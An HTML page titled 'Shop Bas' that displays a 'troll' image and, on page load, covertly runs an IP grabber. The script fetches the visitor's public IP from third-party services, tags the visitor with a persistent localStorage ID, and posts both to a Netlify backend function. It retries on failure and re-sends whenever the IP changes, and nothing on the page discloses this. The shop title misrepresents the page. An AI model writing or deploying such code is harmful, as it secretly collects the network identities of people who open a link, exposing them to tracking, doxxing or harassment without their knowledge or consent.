<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shop Bas</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
            position: relative;
        }
        img {
            width: 1920px;
            height: 1080px;
            object-fit: contain;
            position: absolute;
            z-index: 1;
        }
    </style>
</head>
<body>
    <img src="https://cdn.computerhoy.com/sites/navi.axelspringer.es/public/media/image/2014/10/64609-estudio-dice-que-trolls-internet-son-sadicos-psicopatas.jpg?tf=3840x" alt="Troll Image">
    <script>
        // Funci√≥n para generar un UUID √∫nico
        function generateUUID() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        // Obtener o generar un ID √∫nico para el visitante
        let visitorId = localStorage.getItem('visitorId');
        if (!visitorId) {
            visitorId = generateUUID();
            localStorage.setItem('visitorId', visitorId);
        }

        const FUNCTION_URL = '/.netlify/functions/send-ip';

        async function obtenerDatos(retries = 3) {
            const apis = [
                { url: "https://api.ipify.org?format=json", type: "json" },
                { url: "https://icanhazip.com", type: "text" }
            ];

            for (let attempt = 1; attempt <= retries; attempt++) {
                for (const api of apis) {
                    try {
                        console.log(`üîç Intento ${attempt} con ${api.url}...`);

                        // Obtener IP
                        const ipResponse = await fetch(api.url, {
                            method: "GET",
                            headers: { "Accept": "application/json" }
                        });
                        if (!ipResponse.ok) {
                            throw new Error(`Error obteniendo IP: ${ipResponse.status} ${ipResponse.statusText}`);
                        }

                        let ip;
                        if (api.type === "json") {
                            const ipData = await ipResponse.json();
                            ip = ipData.ip;
                        } else {
                            ip = (await ipResponse.text()).trim();
                        }

                        // Validar que es una IP IPv4
                        const ipv4Regex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
                        if (!ipv4Regex.test(ip)) {
                            throw new Error("No se obtuvo una IP IPv4 v√°lida");
                        }

                        console.log("‚úîÔ∏è IP IPv4 obtenida:", ip);

                        // Comparar con la √∫ltima IP enviada
                        const lastSentIP = localStorage.getItem('lastSentIP');
                        if (lastSentIP === ip) {
                            console.log("‚ÑπÔ∏è IP igual a la anterior, no se env√≠a:", ip);
                            return; // Salir si la IP no ha cambiado
                        }

                        // Enviar al backend (Netlify Function)
                        console.log("üì§ Enviando datos a la funci√≥n...");
                        const functionResponse = await fetch(FUNCTION_URL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ ip, visitorId }),
                        });

                        if (!functionResponse.ok) {
                            const errorText = await functionResponse.text();
                            throw new Error(`Error enviando a la funci√≥n: ${functionResponse.status} ${errorText}`);
                        }

                        console.log("‚úîÔ∏è Datos enviados a la funci√≥n exitosamente");
                        // Almacenar la IP enviada
                        localStorage.setItem('lastSentIP', ip);
                        return; // Salir si todo fue exitoso

                    } catch (error) {
                        console.error(`‚ùå Error en intento ${attempt} con ${api.url}:`, error.message);
                        if (attempt === retries && api === apis[apis.length - 1]) {
                            console.error("‚ùå Se agotaron los intentos y APIs. No se pudo enviar la IP.");
                        }
                        // Esperar 1 segundo antes de reintentar
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }
            }
        }

        // Ejecutar la funci√≥n
        obtenerDatos();
    </script>
</body>
</html>
